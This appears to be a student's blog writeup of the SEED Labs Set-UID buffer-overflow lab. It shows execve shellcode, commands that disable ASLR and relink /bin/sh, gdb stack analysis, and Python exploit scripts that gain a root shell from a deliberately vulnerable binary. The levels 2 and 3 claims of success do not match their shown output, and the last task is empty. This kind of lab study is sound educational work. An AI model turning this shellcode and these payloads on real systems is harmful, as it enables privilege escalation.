---
layout: post
title: "SEED Labs 2.0: Buffer-Overflow Attack Lab (Set-UID Version) Writeup"
category: "Computing Systems"
---

For general overview and the setup package for this lab, please go to [SEED Labs official website](https://seedsecuritylabs.org). The lab assignments were conducted using SEED virtual machine configured on a AWS EC2 instance.

<!-- excerpt-end -->

<br />
## Table of Contents
{:.no_toc}
* TOC 
{:toc}
<br />

## Environment Setup

Ubuntu and several other Linux-based systems uses address space randomization to randomize the starting address of heap and stack. This makes guessing the exact addresses difficult. This feature can be disabled using the following command:

```console
$ sudo sysctl -w kernel.randomize_va_space=0
```

The <code>dash</code> program, as well as <code>bash</code>, has implemented a security countermeasure that prevents itself from being executed in a Set-UID process[^1]. Basically, if they detect that they are executed in a Set-UID process, they will immediately change the effective user ID to the process's real user ID, essentially dropping the privilege. The following command can be used to link <code>/bin/sh</code> to <code>zsh</code> which does not have such a countermeasure:

```console
$ sudo ln -sf /bin/zsh /bin/sh
```

## Task 1: Getting Familiar with Shellcode

The following C program executes a shell program (<code>/bin/sh</code>) using the <code>execve()</code> system call:

```c
#include <stddef.h>
void main()
{
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```

A naive thought is to compile the above code into binary, and then save it to the input file, e.g., <code>badfile</code>. Then we set the targeted return address field to the address of the <code>main()</code> function, so when the vulnerable program returns, it jumps to the entrance of the above code. Unfortunately, this does not work for several reasons:

- **The loader issue**: Before a normal program runs, it needs to be loaded into memory and its running environment needs to be set up. These jobs are conducted by the OS loader, which is responsible for setting up the memory (such as stack and heap), copying the program into memory, invoking the dynamic linker to the needed library functions, etc. After all the initialization is done, the <code>main()</code> function will be triggered. If any of the steps is missing, the program will not be able to run correctly. In a buffer overflow attack, the malicious code is not loaded by the OS; it is loaded directly via memory copy. Therefore, all the essential initialization steps are missing; even if we can jump to the <code>main()</code> function, we will not be able to get the shell program to run.

- **Zeros in the code**: String copying will stop when a zero is found in the source string. When we compile the above C code into binary, at least three zeros will exist in the binary code.

### Invoking the shellcode

```c
/* call_shellcode.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Binary code for setuid(0) 
// 64-bit:  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
// 32-bit:  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"


const char shellcode[] =
#if __x86_64__
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode);
   int (*func)() = (int(*)())code;

   func();
   return 1;
}
```

Compile and the run the <code>call_shellcode.c</code> program:

```console
~/Documents/BufferSetUID/shellcode$ make
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
~/Documents/BufferSetUID/shellcode$ ./a32.out
$ echo -ne 'Don't go gentle into that good night/'
> .!?'
Dont go gentle into that good night/
.!?%
$ exit
~/Documents/BufferSetUID/shellcode$ ./a64.out
$ echo -ne 'Oh Danny Boy the pipes the pipes are calling.'
Oh Danny Boy the pipes the pipes are calling.%
```

## Task 2: Understanding the Vulnerable Program

The <code>stack.c</code> program shown below reads $517$ bytes of data from a file called "<code>badfile</code>", and then copies the data to a buffer of size $100$:

```c
/* stack.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

void dummy_function(char *str);

int bof(char *str)
{
    char buffer[BUF_SIZE];

    // The following statement has a buffer overflow problem 
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    if (!badfile) {
       perror("Opening badfile"); exit(1);
    }

    int length = fread(str, sizeof(char), 517, badfile);
    printf("Input size: %d\n", length);
    dummy_function(str);
    fprintf(stdout, "==== Returned Properly ====\n");
    return 1;
}

// This function is used to insert a stack frame of size 
// 1000 (approximately) between main's and bof's stack frames. 
// The function itself does not do anything. 
void dummy_function(char *str)
{
    char dummy_buffer[1000];
    memset(dummy_buffer, 0, 1000);
    bof(str);
}
```

Compile and run <code>stack.c</code>:

```console
~/Documents/BufferSetUID/code$ make
gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -o stack-L1 stack.c
gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -g -o stack-L1-dbg stack.c
sudo chown root stack-L1 && sudo chmod 4755 stack-L1
gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -o stack-L2 stack.c
gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -g -o stack-L2-dbg stack.c
sudo chown root stack-L2 && sudo chmod 4755 stack-L2
gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -m32 -o stack-L3 stack.c
gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -m32 -g -o stack-L3-dbg stack.c
sudo chown root stack-L3 && sudo chmod 4755 stack-L3
gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -m32 -o stack-L4 stack.c
gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -m32 -g -o stack-L4-dbg stack.c
sudo chown root stack-L4 && sudo chmod 4755 stack-L4
~/Documents/BufferSetUID/code$ ls
Makefile        stack-L1        stack-L2-dbg    stack-L4
brute-force.sh  stack-L1-dbg    stack-L3        stack-L4-dbg
exploit.py      stack-L2        stack-L3-dbg    stack.c
```

## Task 3: Launching Attack on $32$-bit Program (Level 1)

### Investigation

```console
~/Documents/BufferSetUID/code$ touch badfile
~/Documents/BufferSetUID/code$ gdb stack-L1-dbg
gdb-peda$ break bof
Breakpoint 1 at 0x12ad: file stack.c, line 16.
gdb-peda$ run
Starting program: /home/seed/Documents/BufferSetUID/code/stack-L1-dbg
Input size: 0
[----------------------------------registers-----------------------------------]
EAX: 0xffffcdb8 --> 0x0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x60 ('`')
EDX: 0xffffd1a0 --> 0xf7fb5000 --> 0x1e6d6c 
ESI: 0xf7fb5000 --> 0x1e6d6c 
EDI: 0xf7fb5000 --> 0x1e6d6c 
EBP: 0xffffd1a8 --> 0xffffd3d8 --> 0x0 
ESP: 0xffffcd9c --> 0x565563ee (<dummy_function+62>:	add    esp,0x10)
EIP: 0x565562ad (<bof>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562a4 <frame_dummy+4>:	jmp    0x56556200 <register_tm_clones>
   0x565562a9 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x565562ac <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x565562ad <bof>:	endbr32 
   0x565562b1 <bof+4>:	push   ebp
   0x565562b2 <bof+5>:	mov    ebp,esp
   0x565562b4 <bof+7>:	push   ebx
   0x565562b5 <bof+8>:	sub    esp,0x74
[------------------------------------stack-------------------------------------]
0000| 0xffffcd9c --> 0x565563ee (<dummy_function+62>:	add    esp,0x10)
0004| 0xffffcda0 --> 0xffffd1c3 --> 0x456 
0008| 0xffffcda4 --> 0x0 
0012| 0xffffcda8 --> 0x3e8 
0016| 0xffffcdac --> 0x565563c3 (<dummy_function+19>:	add    eax,0x2bf5)
0020| 0xffffcdb0 --> 0x0 
0024| 0xffffcdb4 --> 0x0 
0028| 0xffffcdb8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (str=0xffffd1c3 "V\004") at stack.c:16
16	{
```

When <code>gdb</code> stops inside the <code>bof</code> function, it stops before the <code>%ebp</code> register is set to point to the current stack frame, so if we print out the value of <code>$ebp</code> here, we will get the caller's <code>$ebp</code> value. We need to use the <code>next</code> command[^2] to execute a few instructions and stop after the <code>%ebp</code> register is modified to point to the stack frame of the <code>bof</code> function.

```console
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fb8 --> 0x3ec0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x60 ('`')
EDX: 0xffffd1a0 --> 0xf7fb5000 --> 0x1e6d6c 
ESI: 0xf7fb5000 --> 0x1e6d6c 
EDI: 0xf7fb5000 --> 0x1e6d6c 
EBP: 0xffffcd98 --> 0xffffd1a8 --> 0xffffd3d8 --> 0x0 
ESP: 0xffffcd20 ("1pUV\264\321\377\377\220\325\377\367\340\263\374", <incomplete sequence \367>)
EIP: 0x565562c2 (<bof+21>:	sub    esp,0x8)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562b5 <bof+8>:	sub    esp,0x74
   0x565562b8 <bof+11>:	call   0x565563f7 <__x86.get_pc_thunk.ax>
   0x565562bd <bof+16>:	add    eax,0x2cfb
=> 0x565562c2 <bof+21>:	sub    esp,0x8
   0x565562c5 <bof+24>:	push   DWORD PTR [ebp+0x8]
   0x565562c8 <bof+27>:	lea    edx,[ebp-0x6c]
   0x565562cb <bof+30>:	push   edx
   0x565562cc <bof+31>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffcd20 ("1pUV\264\321\377\377\220\325\377\367\340\263\374", <incomplete sequence \367>)
0004| 0xffffcd24 --> 0xffffd1b4 --> 0x0 
0008| 0xffffcd28 --> 0xf7ffd590 --> 0xf7fd1000 --> 0x464c457f 
0012| 0xffffcd2c --> 0xf7fcb3e0 --> 0xf7ffd990 --> 0x56555000 --> 0x464c457f 
0016| 0xffffcd30 --> 0x0 
0020| 0xffffcd34 --> 0x0 
0024| 0xffffcd38 --> 0x0 
0028| 0xffffcd3c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
20	    strcpy(buffer, str);
```

Print out <code>$ebp</code> and the buffer's address:

```console
gdb-peda$ p $ebp
$1 = (void *) 0xffffcd98
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffcd2c
```

### Launching attacks

Since the value of the stack frame pointer is <code>0xffffcd98</code>, the return address is stored in <code>0xffffcd98 + 4</code>; the first address that we can jump to is <code>0xffffcd98 + 8</code>, which can be put inside the return address field. The distance between the address of the <code>%ebp</code> register (<code>0xffffcd98</code>) and the buffer (<code>0xffffcd2c</code>) is <code>0x6c</code>, which is $108$ in decimal notation. Therefore, the distance between the buffer's starting point and the return address field is $112$.

To generate the "<code>badfile</code>" using <code>exploit.py</code>, an array of size $517$ bytes is created and filled with <code>0x90</code> (the <code>NOP</code> instruction). Since <code>gdb</code> may push some additional data onto the stack at the beginning, causing the stack frame to be allocated deeper than it would be when the program executes directly, the first address that we can jump to may be higher than <code>$ebp + 8</code>. Here I choose <code>$ebp + 120</code>. The return address field starts from offset $112$ and ends at offset $116$ (not including $116$), i.e., <code>content[112:116]</code>. The x86 architecture uses the little-endian order, so in Python, when putting a $4$-byte address into the memory, <code>byteorder='little'</code> is used to specify the byte order.

At the end of the "<code>badfile</code>", a bunch of shellcode is included, the aim of which is to use the <code>execve()</code> system call to run <code>/bin/sh</code>. The corresponding program is presented in [Task 1](#task-1-getting-familiar-with-shellcode). Registers <code>%eax</code>, <code>%ebx</code>, <code>%ecx</code>, <code>%edx</code> should be configured correctly. A system call is executed using the instruction <code>int $0x80</code>.

```yaml
"\x31\xc0"      # xorl  %eax, %eax
"\x50"          # pushl %eax
"\x68""//sh"    # pushl $0x68732f2f
"\x68""/bin"    # pushl $0x6e69622f
"\x89\xe3"      # movl  %esp, %ebx
"\x50"          # pushl %eax
"\x53"          # pushl %ebx
"\x89\xe1"      # movl  %esp, %ecx
"\x99"          # cdq
"\xb0\x0b"      # movb  $0x0b, %al
"\xcd\x80"      # int   $0x80
```

- Line 1: Using XOR operation on <code>%eax</code> will set <code>%eax</code> to zero without introducing a zero in the code.
- Line 2: Push a zero onto the stack, which marks the end of the "<code>/bin/sh</code>" string.
- Line 3: Push "<code>//sh</code>" onto the stack (double slash, treated by the system call as the same as the single slash, is used because $4$ bytes are needed for instruction).
- Line 4: Push "<code>/bin</code>" onto the stack. The stack pointer <code>%esp</code> now points to the beginning of the string.
- Line 5: Move <code>%esp</code> to <code>%ebx</code>.
- Line 6: Construct the second item of the <code>name</code> array.
- Line 7: Form the first entry of the <code>name</code> array.
- Line 8: Save the value of <code>%esp</code> to <code>%ecx</code>. Now the <code>ecx</code> register contains the address of the <code>name</code> array.
- Line 9: Basically, the instruction copies the sign bit of the value in <code>%eax</code> into every bit position in <code>%edx</code>, sets <code>%edx</code> to zero.
- Line 10: Save the system call number ($11$ for <code>execve()</code>) in the <code>eax</code> register (<code>%al</code> represents the lower $8$ bits of the <code>eax</code> register, the higher bits are still zero).
- Line 11: Executes the system call. <code>int</code> means interrupt, which transfers the program flow to the interrupt handler.

The modified <code>exploit.py</code> program is listed below:

```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0"
  "\x50"
  "\x68""//sh"
  "\x68""/bin"
  "\x89\xe3"
  "\x50"
  "\x53"
  "\x89\xe1"
  "\x99"
  "\xb0\x0b"
  "\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffcd98 + 120           # Change this number 
offset = 112              # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

Run <code>stack-L1</code>:

```console
~/Documents/BufferSetUID/code$ ./stack-L1
Input size: 517
# id
uid=1001(seed) gid=1001(seed) euid=0(root) groups=1001(seed),120(docker)
#
```

Root shell is obtained!

## Task 4: Launching Attack without Knowing Buffer Size (Level 2)

Before comming up with a solution, I created a $1024$-byte random pattern and run in <code>gdb</code>:

```console
gdb-peda$ pattern create 1024 pat-L2
Writing pattern of 1024 chars to filename "pat-L2"
gdb-peda$ run $(cat pat-L2)
Starting program: /home/seed/Documents/BufferSetUID/code/stack-L2-dbg $(cat pat-L2)
Input size: 517

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x90909090 
ECX: 0xffffcff0 --> 0x90909090 
EDX: 0xffffcb1d --> 0x90909090 
ESI: 0xf7faa000 --> 0x1e6d6c 
EDI: 0xf7faa000 --> 0x1e6d6c 
EBP: 0x90909090 
ESP: 0xffffc9d0 --> 0x90909090 
EIP: 0x90909090
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x90909090
[------------------------------------stack-------------------------------------]
0000| 0xffffc9d0 --> 0x90909090 
0004| 0xffffc9d4 --> 0x90909090 
0008| 0xffffc9d8 --> 0x90909090 
0012| 0xffffc9dc --> 0x90909090 
0016| 0xffffc9e0 --> 0x90909090 
0020| 0xffffc9e4 --> 0x90909090 
0024| 0xffffc9e8 --> 0x90909090 
0028| 0xffffc9ec --> 0x90909090 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x90909090 in ?? ()
```

This is what I got from <code>x/200x $esp</code>:

```console
0xffffca80:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffca90:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffcaa0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffcab0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffcac0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffcad0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffcae0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffcaf0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffcb00:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffcb10:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffcb20:     0x90909090      0x00020590      0x00000000      0x00000000
0xffffcb30:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb40:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb60:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb70:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb80:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb90:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcba0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbb0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbc0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbd0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbe0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbf0:     0x00000000      0x00000000      0x00000000      0x00000000
```

Obtain the address of the buffer:

```console
gdb-peda$ x $ebp
0xffffcdc8:     0xffffd1d8
gdb-peda$ p/d 0xffffd1d8 - 0xffffcdc8
$1 = 1040
gdb-peda$ x $esp
0xffffcd20:     0
gdb-peda$ x $eip
0x565562c5 <bof+24>:    -16192381
gdb-peda$ x &buffer
0xffffcd20:     0
```

The *spraying* approach puts all the possible locations of return address into the <code>badfile</code>, instead of one location. Since we know that the range of the buffer size is from $100$ to $200$ bytes, the actual distance between the return address field and the beginning of the buffer will be at most $200$ plus some small value; I use $220$ here. If the first $220$ bytes of the buffer (from <code>0xffffcd20</code> to <code>0xffffcd20 + 220</code>) are all sprayed with the return address, it can be assured that one of them will overwrite the actual return address field.

The modified <code>exploit.py</code> program is presented below:

```python
#!/usr/bin/python3
import sys

shellcode= (
  "\x31\xc0"
  "\x50"
  "\x68""//sh"
  "\x68""/bin"
  "\x89\xe3"
  "\x50"
  "\x53"
  "\x89\xe1"
  "\x99"
  "\xb0\x0b"
  "\xcd\x80"
).encode('latin-1')
content = bytearray(0x90 for i in range(517))

start = 517 - len(shellcode)
content[start:start + len(shellcode)] = shellcode

ret    = 0xffffcd24 + 220
L = 4
addr = (ret).to_bytes(L, byteorder='little')
content[0 : 219] = addr * 55

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

Just as expected, level 2 is solved:

```console
~/Documents/BufferSetUID/code$ vim exploit.py
~/Documents/BufferSetUID/code$ ./exploit.py
~/Documents/BufferSetUID/code$ ./stack-L2
Input size: 517
==== Returned Properly ====
```

## Task 5: Launching Attack on $64$-bit Program (Level 3)

Although the x86-64 architecture supports $64$-bit address space, only the address from <code>0x00</code> through <code>0x00007fffffffffff</code> is allowed. That means for every address ($8$ bytes), the highest two bytes are always zeros. More specifically, in a typical $48$-bit implementation, *canonical* address refers to one in the range code>0x00</code> through <code>0x00007fffffffffff</code> and code>0xffff800000000000</code> through <code>0xffffffffffffffff</code>. Any address outside this range is *non-canonical*. In our buffer-overflow attacks, we need to store at least one address in the payload, and the payload will be copied onto the stack via <code>strcpy()</code>, which will stop copying when it sees a zero. Therefore, if zero appears in the middle of the payload, the content after the zero cannot be copied onto the stack. How to solve this problem is the most difficult challenge in this attack.

First, I modified the <code>exploit.py</code> in the way that a <code>badfile</code> filled with $1000$ A's was generated:

```python
content = b"A" * 1000
```

We can observe in the <code>gdb</code> view that the vulnerability exists:

```console
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x1 
RBX: 0x555555555360 (<__libc_csu_init>: endbr64) 
RCX: 0x414141 ('AAA') 
RDX: 0x5 
RSI: 0x7fffffffe240 --> 0x4141414141 ('AAAAA')
RDI: 0x7fffffffdd40 --> 0x4141414141 ('AAAAA')
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffdc18 ('A' <repeats 200 times>...)
RIP: 0x55555555525e (<bof+53>:  ret)
R8 : 0x0
R9 : 0x10
R10: 0x55555555602c --> 0x52203d3d3d3d000a ('\n')
R11: 0x246
R12: 0x555555555140 (<_start>:  endbr64)
R13: 0x7fffffffe350 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
```

However, <code>%rip</code> was not overwritten with A's, since it did not load a non-canonical address:

```console
Stopped reason: SIGSEGV
0x000055555555525e in bof (str=0x7fffffffe040 'A' <repeats 200 times>...)
    at stack.c:23
23	}
gdb-peda$ p $rip
$1 = (void (*)()) 0x55555555525e <bof+53>
gdb-peda$ x $rip
0x55555555525e <bof+53>:	"\303\363\017\036\372UH\211\345H\201\354\060\002"
gdb-peda$ x $rbp
0x4141414141414141:	<error: Cannot access memory at address 0x4141414141414141>
```

If we set a breakpoint at the start of the <code>bof</code> function and run again, we get:

```console
Breakpoint 1, bof (str=0x2 <error: Cannot access memory at address 0x2>)
    at stack.c:16
16	{
gdb-peda$ x $rsp
0x7fffffffdc18:	0x000055555555535c
gdb-peda$ x $rbp
0x7fffffffe020:	0x00007fffffffe260
```

Ater typing <code>next</code>, we get:

```console
20	    strcpy(buffer, str);       
gdb-peda$ x $rsp
0x7fffffffdb30:	0x00007fffffffdac0
gdb-peda$ x $rbp
0x7fffffffdc10:	0x00007fffffffe020
```

To better understand the stack frame layout in x86-64 architecture, I went through AMD64 ABI 1.0 published on December 22, 2018 and found something really helpful:

> Each function has a frame on the run-time stack. This stack grows downwards from high addresses ... The value <code>%rsp + 8</code> is always a multiple of $16$ ($32$ or $64$) when control is transferred to the function entry point. The stack pointer, <code>%rsp</code>, always points to the end of the latest allocated stack frame. The $128$-byte area beyond the location pointed to by <code>%rsp</code> is considered to be reserved and shall not be modified by signal or interrupt handlers. Therefore, functions may use this area for temporary data that is not needed across function calls. In particular, leaf functions may use this area for their entire stack frame, rather than adjusting the stack pointer in the prologue and epilogue. This area is known as the *red zone* ... After the argument values have been computed, they are placed either in registers or pushed on the stack ... The size of each argument gets rounded up to eight bytes (therefore the stack will always be eight-byte aligned).

It should be noted that the first six arguments are not pushed on the stack but stored in registers on a $64$-bit architecture whereas in a $32$-bit architecture all the function arguments are pushed on the stack. To conclude, the latest allocated stack frame from low to high addresses is arranged as follows: $128$-byte red zone, register <code>%rsp</code>, local variables, register <code>%rbp</code>, saved return address (which is the value in register <code>%rip</code>), parameters. Whenever a function returns, the "saved return address" is popped from the stack and loaded in register <code>%rsp</code> and execution continues from that address.

The offset can be found by:

```console
gdb-peda$ p/x (unsigned long long) $rsp - (unsigned long long) &buffer
$1 = 0xd8
```

Then, exploit.py can be modified as:

```python
content = bytearray(0x90 for i in range(517))

start = 517 - len(shellcode)
content[start:start + len(shellcode)] = shellcode

ret    = 0x7fffffffdb40 + 220
L = 8
addr = (ret).to_bytes(L,byteorder='little')
content[0:0xd7] = addr * 27

with open('badfile', 'wb') as f:
  f.write(content)
```

As a result, level 3 is solved:

```console
~/Documents/BufferSetUID/code$ vim exploit.py
~/Documents/BufferSetUID/code$ ./exploit.py
~/Documents/BufferSetUID/code$ ./stack-L3
Input size: 517
==== Returned Properly ====
```

## Task 6: Launching Attack on $64$-bit Program (Level 4)



## Notes

[^1]: A privileged program is one that can give users extra privileges beyond that are already assigned to them. A Set-Root-UID program is a privileged program because it allows users to gain the root privilege during the execution of the programs. For Set-UID programs in UNIX and UNIX-like operating systems, which stands for **set user ID on execution**, the effective <code>uid</code> is the owner of the program, while the real <code>uid</code> is the user of the program. Windows does not have the notion of Set-UID. A different mechanism is used for implementing privileged functionality. A developer would write a privileged program as a service and the user sends the command line arguments to the service using Local Procedure Call.

[^2]: Continue to the next source line in the current (innermost) stack frame. This is similar to <code>step</code>, but function calls that appear within the line of code are executed without stopping. Execution stops when control reaches a different line of code at the original stack level that was executing when you gave the <code>next</code> command.